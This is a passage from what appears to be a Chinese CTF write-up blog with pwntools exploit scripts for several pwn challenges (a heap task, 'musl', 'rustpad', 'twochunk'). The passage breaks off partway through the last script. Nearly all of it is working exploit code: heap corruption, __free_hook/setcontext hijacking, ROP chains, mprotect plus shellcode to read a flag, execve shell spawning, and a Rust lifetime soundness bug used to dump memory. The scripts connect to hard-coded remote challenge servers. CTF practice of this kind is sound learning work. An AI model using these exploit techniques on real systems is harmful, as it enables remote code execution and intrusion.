class="string">"?&amp;#92;n"</span>,data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">2</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?&amp;#92;n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">        cmd(<span class="number">4</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?&amp;#92;n"</span>,str(idx))</span><br><span class="line">        p.sendafter(<span class="string">"?&amp;#92;n"</span>,c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">3</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?&amp;#92;n"</span>,str(idx))</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn',env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line">p=remote(<span class="string">"121.36.209.145"</span>,<span class="number">9998</span>)</span><br><span class="line">p.sendafter(<span class="string">"? &amp;#92;n"</span>,<span class="string">"X"</span>*<span class="number">0x90</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0xbabe132</span>))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">"B"</span>*<span class="number">0x200</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>*<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>*<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">"A"</span>*<span class="number">0x200</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x21</span>)*<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">base=u64(p.readline()[:<span class="number">-1</span>]+<span class="string">'&amp;#92;0&amp;#92;0'</span>)-(<span class="number">0x7ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.warning(hex(base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"AC"</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x603280</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>*<span class="number">0x71</span>+<span class="string">"&amp;#92;x00"</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000021102</span>+base</span><br><span class="line">rsi=<span class="number">0x00000000000202e8</span>+base</span><br><span class="line">rdx=<span class="number">0x0000000000001b92</span>+base</span><br><span class="line">rax=<span class="number">0x0000000000001b92</span>+base</span><br><span class="line">syscall=<span class="number">0x00000000000bc375</span>+base</span><br><span class="line">rbp=<span class="number">0x000000000001f930</span>+base</span><br><span class="line">leave=<span class="number">0x0000000000042351</span>+base</span><br><span class="line">libc.address=base</span><br><span class="line">rop=flat(rax,<span class="number">0</span>,rdi,<span class="number">0</span>,rsi,<span class="number">0x00604000</span><span class="number">-0x800</span>,rdx,<span class="number">0x300</span>,syscall,<span class="number">0x00604000</span><span class="number">-0x800</span>)</span><br><span class="line">edit(<span class="number">11</span>,rop.ljust(<span class="number">0x50</span>,<span class="string">'&amp;#92;0'</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">0x35</span>))</span><br><span class="line">magic=<span class="number">0x603280</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x68</span>)+p64(magic&amp;amp;<span class="number">0xffffff000</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>)+p64(<span class="number">0x7</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">'&amp;#92;x00'</span>)+p64(<span class="number">0x603290</span>)+p64(libc.sym[<span class="string">'mprotect'</span>])</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *&#123;&#125;'.format(hex(0x47b75+base)))</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sh=<span class="string">"""</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rsi,0x603280</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov al,1</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,0x603280</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(asm(shellcraft.open(<span class="string">"./flag"</span>))+asm(sh))</span><br><span class="line">p.interactive(<span class="string">'n132&gt;'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>用的是musl-libc,看一下内存发现可以直接泄漏然后有个溢出造成任意写，继而泄漏stack，完成ROP.<br>（remote的偏移需要一点点爆破）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"&gt; "</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,c=<span class="string">"A&amp;#92;n"</span>,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">        cmd(<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(size))</span><br><span class="line">        <span class="keyword">if</span>(flag):</span><br><span class="line">                p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"Y"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"N"</span>)</span><br><span class="line">        <span class="keyword">if</span>(size!=<span class="number">0</span>):</span><br><span class="line">                p.sendafter(<span class="string">"&gt;"</span>,c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">        cmd(<span class="number">3</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line">        p.send(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">2</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">4</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#libc=ELF('./libc.so.6')</span></span><br><span class="line">flag=<span class="number">0x000000000602038</span></span><br><span class="line">p=remote(<span class="string">"119.3.158.103"</span>,<span class="number">19008</span>)</span><br><span class="line"><span class="comment">#p=process('./ppp',env=&#123;"LD_PRELOAD":"./libc.so"&#125;)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"AAA&amp;#92;n"</span>)</span><br><span class="line">add(<span class="number">0x0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">base=u64(p.read(<span class="number">6</span>)+<span class="string">'&amp;#92;0&amp;#92;0'</span>)-(<span class="number">0x7f1b10207e50</span><span class="number">-0x7f1b0ff75000</span>)<span class="comment">#+0x18</span></span><br><span class="line">log.warning(hex(base))</span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0xdeadbeef2</span>)+<span class="string">'&amp;#92;n'</span>)</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">0x3</span>)</span><br><span class="line">free(<span class="number">0x4</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"A"</span>*<span class="number">0x10</span>+p64(<span class="number">0x21</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>+<span class="number">0x00007f911dc6b000</span><span class="number">-0x00007f911d9db000</span>+base+<span class="number">8</span><span class="number">-0x10</span>)*<span class="number">2</span>+<span class="string">'&amp;#92;n'</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"FLAG&amp;#92;n"</span>)<span class="comment">#4</span></span><br><span class="line">call=<span class="number">0x7f8833bda318</span><span class="number">-0x00007f8833948000</span>+base</span><br><span class="line"></span><br><span class="line">stack=<span class="number">0x7f6eebb192f0</span><span class="number">-0x7f6eeb884000</span>+base</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x80</span>)+p64(call)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x602030</span>)+p64(<span class="number">0x80</span>)+p64(stack)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x7fe73119f010</span><span class="number">-0x7fe730f0f000</span>+base)+<span class="string">'&amp;#92;n'</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0xdeadbeef</span>)+<span class="string">"&amp;#92;n"</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+<span class="string">'&amp;#92;1&amp;#92;x0a'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">stack=u64(p.read(<span class="number">6</span>)+<span class="string">'&amp;#92;0&amp;#92;0'</span>)<span class="comment">#-(0x00007ffcba657898-0x00007ffcba637000)</span></span><br><span class="line"><span class="comment">#stack+=0x1000</span></span><br><span class="line"><span class="comment">#stack=stack</span></span><br><span class="line">log.warning(hex(stack))</span><br><span class="line">edit(<span class="number">5</span>,flat(<span class="number">0x80</span>,stack+<span class="number">0x7ffe74dcbfe8</span><span class="number">-0x7ffe74dcc068</span><span class="number">-0x40</span>)+<span class="string">'&amp;#92;n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x000000000400F45')</span></span><br><span class="line">ret=<span class="number">0x000000000400F80</span></span><br><span class="line">rsi=<span class="number">0x000000000001c237</span>+base</span><br><span class="line">rdx=<span class="number">0x000000000001bea2</span>+base</span><br><span class="line">rdi=<span class="number">0x0000000000014862</span>+base</span><br><span class="line">system=<span class="number">0x7ff4bb16a688</span><span class="number">-0x7ff4bb128000</span>+base</span><br><span class="line">exe=<span class="number">0x7f49d027dc09</span><span class="number">-0x7f49d023c000</span>+base</span><br><span class="line">edit(<span class="number">1</span>,p64(ret)*<span class="number">8</span>+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)+p64(rdi)+p64(<span class="number">0x7ff4bb1b9345</span><span class="number">-0x7ff4bb128000</span>+base)+p64(exe)+<span class="string">'&amp;#92;n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rustpad"><a href="#rustpad" class="headerlink" title="rustpad"></a>rustpad</h2><p>根据提示可以找到一个类似的原题，改改exp就行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'159.138.4.209'</span>, <span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">static UNIT: &amp;amp;'static &amp;amp;'static () = &amp;amp;&amp;amp;();</span></span><br><span class="line"><span class="string">static gstr:&amp;amp;'static str = "YOUR STRING HERE";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fn foo&lt;'a, 'b, T&gt;(_: &amp;amp;'a &amp;amp;'b (), v: &amp;amp;'b T) -&gt; &amp;amp;'a T &#123; v &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fn bad&lt;'a, T&gt;(x: &amp;amp;'a T) -&gt; &amp;amp;'static T &#123;</span></span><br><span class="line"><span class="string">    let f: fn(_, &amp;amp;'a T) -&gt; &amp;amp;'static T = foo;</span></span><br><span class="line"><span class="string">    f(UNIT, x)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pub fn code()&#123;</span></span><br><span class="line"><span class="string">    fn inner() -&gt; &amp;amp;'static Vec&lt;u8&gt; &#123;</span></span><br><span class="line"><span class="string">        let x = Box::new(Vec::new());</span></span><br><span class="line"><span class="string">        bad(&amp;amp;*x)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let x = inner();</span></span><br><span class="line"><span class="string">    let mut y = Box::new((1usize, 2usize, 3usize));</span></span><br><span class="line"><span class="string">    println!("x: &#123;:?&#125; &#123;&#125; &#123;&#125;", x.as_ptr(), x.capacity(), x.len());</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let mut r = |addr: usize| &#123; y.0 = addr; x[0] &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let r64 = |r: &amp;amp;mut FnMut(usize) -&gt; u8, x: usize| &#123;</span></span><br><span class="line"><span class="string">        let mut tmp = 0usize;</span></span><br><span class="line"><span class="string">        for j in 0..8 &#123;</span></span><br><span class="line"><span class="string">            tmp |= (r(x+j) as usize) &lt;&lt; (8 * j);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        tmp</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">    let dump = |r: &amp;amp;mut FnMut(usize) -&gt; u8, start: usize, len: usize| &#123;</span></span><br><span class="line"><span class="string">        let mut out = Vec::with_capacity(len);</span></span><br><span class="line"><span class="string">        for i in 0..len &#123;</span></span><br><span class="line"><span class="string">            out.push(r(start+i));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        out</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let mut prog_ptr: usize = &amp;amp;gstr as *const _ as _;</span></span><br><span class="line"><span class="string">    let mut prog_str_addr = r64(&amp;amp;mut r, prog_ptr);</span></span><br><span class="line"><span class="string">    let mut prog1 = prog_str_addr - (prog_str_addr &amp;amp; 0xfff);</span></span><br><span class="line"><span class="string">    let heap: usize = Box::into_raw(Box::new(0x4242424242424242usize)) as _;</span></span><br><span class="line"><span class="string">    println!("y: &#123;:?&#125; &#123;:?&#125;", prog1, heap);</span></span><br><span class="line"><span class="string">    let mut dump_data = dump(&amp;amp;mut r, prog1, 0x1000);</span></span><br><span class="line"><span class="string">    println!("data: &#123;:?&#125;", dump_data);</span></span><br><span class="line"><span class="string">    println!("end:");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    //for i in 0..4092&#123;</span></span><br><span class="line"><span class="string">    //    if dump_data[i] == 114 &amp;amp;&amp;amp; dump_data[i+1] == 101 &#123;</span></span><br><span class="line"><span class="string">    //       for q in 0..100000000 &#123;</span></span><br><span class="line"><span class="string">    //       &#125;</span></span><br><span class="line"><span class="string">    //    &#125;</span></span><br><span class="line"><span class="string">    //&#125;</span></span><br><span class="line"><span class="string">    //println!("str: &#123;:?&#125;", dump(&amp;amp;mut r, prog_str_addr, 0x10));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">ru(<span class="string">'thought?'</span>)</span><br><span class="line">se(code)</span><br><span class="line">ru(<span class="string">"data: "</span>)</span><br><span class="line">data = eval(ru(<span class="string">"end"</span>)[:<span class="number">-3</span>])</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    s += chr(i)</span><br><span class="line"></span><br><span class="line">f = s.index(<span class="string">'flag'</span>)</span><br><span class="line">print(s[f:f+<span class="number">0x40</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="twochunk"><a href="#twochunk" class="headerlink" title="twochunk"></a>twochunk</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./twochunk'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">''</span>,)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,sz)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'idx:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'size:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'idx:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'idx: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'idx: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'content'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'choice: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'6'</span>)</span><br><span class="line">    ru(<span class="string">'leave your end message: '</span>)</span><br><span class="line">    se(<span class="string">'123'</span>)</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'name'</span>)</span><br><span class="line">se(<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">'message'</span>)</span><br><span class="line">se(<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">23333</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(ru(<span class="string">'1.'</span>)[:<span class="number">-2</span>])</span><br><span class="line">pbase = heap - <span class="number">0x52a0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x118</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x118</span>)</span><br><span class="line">delete(<span 